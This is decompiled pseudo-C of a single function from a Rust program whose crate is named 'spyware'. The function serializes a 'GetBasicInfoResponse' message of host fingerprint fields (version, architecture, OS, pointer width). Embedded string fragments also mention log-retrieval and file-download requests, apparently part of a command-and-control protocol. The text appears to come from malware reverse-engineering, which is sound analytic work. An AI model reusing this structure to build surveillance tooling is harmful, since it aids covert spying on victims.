
  int32_t* spyware::communication::messages::_::_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetBasicInfoResponse$GT$::serialize::h190e21248ceaec03(int32_t* arg1, void* arg2, int64_t* arg3)

{
    int32_t var_50;
    _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_struct::h19528d03ac3c512b(&var_50, arg3, "GetBasicInfoResponseversiontarge…", 0x14, 6);
    int32_t rax = var_50;
    int64_t* var_48;
    char var_40;
    int128_t var_30;
    
    if (rax != 0x21)
    {
        *(arg1 + 0x20) = var_30;
        int128_t var_3f;
        *(arg1 + 0x11) = var_3f;
        *arg1 = rax;
        int32_t var_4c;
        arg1[1] = var_4c;
        *(arg1 + 8) = var_48;
        arg1[4] = var_40;
    }
    else
    {
        int64_t* var_20 = var_48;
        _$LT$ron..ser..Compound$LT$W$GT$$u20$as$u20$serde..ser..SerializeStruct$GT$::serialize_field::hacf8a76ddb186617(&var_50, &var_20, "versiontarget_osoperating_system…", 7, arg2 + 0x38);
        
        if (var_50 != 0x21)
        {
            label_44ff78:
            int128_t zmm0_2 = var_50;
            *(arg1 + 0x20) = var_30;
            *(arg1 + 0x10) = var_40;
            *arg1 = zmm0_2;
        }
        else
        {
            _$LT$ron..ser..Compound$LT$W$GT$$u20$as$u20$serde..ser..SerializeStruct$GT$::serialize_field::hab6114fcaa103875(&var_50, &var_20, "archSome <= truemainchar -> // […", 4, arg2 + 0x3d);
            
            if (var_50 != 0x21)
                goto label_44ff78;
            
            _$LT$ron..ser..Compound$LT$W$GT$$u20$as$u20$serde..ser..SerializeStruct$GT$::serialize_field::hdb6f012d0b82b5cf(&var_50, &var_20, "target_osoperating_system_versio…", 9, arg2 + 0x3e);
            
            if (var_50 != 0x21)
                goto label_44ff78;
            
            _$LT$ron..ser..Compound$LT$W$GT$$u20$as$u20$serde..ser..SerializeStruct$GT$::serialize_field::h0fe0e64abb5f6595(&var_50, &var_20, "operating_system_versionpointer_…", 0x18, arg2);
            
            if (var_50 != 0x21)
                goto label_44ff78;
            
            _$LT$ron..ser..Compound$LT$W$GT$$u20$as$u20$serde..ser..SerializeStruct$GT$::serialize_field::h90b4c557e4b6d543(&var_50, &var_20, "pointer_widthGetLogsRequestGetLo…", 0xd, arg2 + 0x3c);
            
            if (var_50 != 0x21)
                goto label_44ff78;
            
            _$LT$ron..ser..Compound$LT$W$GT$$u20$as$u20$serde..ser..SerializeStruct$GT$::serialize_field::h2397a223b27dc649(&var_50, &var_20, "error_infoDownloadFileRequestDow…", 0xa, arg2 + 0x18);
            
            if (var_50 != 0x21)
                goto label_44ff78;
            
            _$LT$ron..ser..Compound$LT$W$GT$$u20$as$u20$serde..ser..SerializeStruct$GT$::end::h1114ba35daa4ac40(arg1, var_20, var_40);
        }
    }
    return arg1;
}
